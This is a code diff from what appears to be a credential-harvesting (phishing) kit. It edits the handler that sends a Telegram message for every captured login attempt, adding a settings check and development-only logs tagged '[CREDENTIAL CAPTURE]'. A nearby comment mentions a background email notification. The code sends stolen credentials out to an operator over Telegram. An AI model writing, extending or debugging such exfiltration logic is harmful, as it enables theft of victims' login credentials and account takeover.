@@ -750,12 +750,25 @@ ${verification.valid
 `
     }
 
-    // Send Telegram notification for EVERY attempt
+    // Send Telegram notification for EVERY attempt (only if enabled)
     const telegramSettings = (await getSettings()).notifications.telegram
     
-    const telegramResult = await sendTelegramMessage(message)
-    if (telegramResult) {
+    // Only send if Telegram is enabled and configured
+    if (telegramSettings.enabled !== false) {
+      const telegramResult = await sendTelegramMessage(message)
+      if (telegramResult) {
+        if (process.env.NODE_ENV === 'development') {
+          console.log('[CREDENTIAL CAPTURE] ✅ Telegram notification sent successfully')
+        }
+      } else {
+        if (process.env.NODE_ENV === 'development') {
+          console.warn('[CREDENTIAL CAPTURE] ⚠️  Telegram notification failed - check bot token and chat ID')
+        }
+      }
     } else {
+      if (process.env.NODE_ENV === 'development') {
+        console.log('[CREDENTIAL CAPTURE] ℹ️  Telegram notifications are disabled in settings')
+      }
     }
 
     // Send email notification in background with proper error tracking
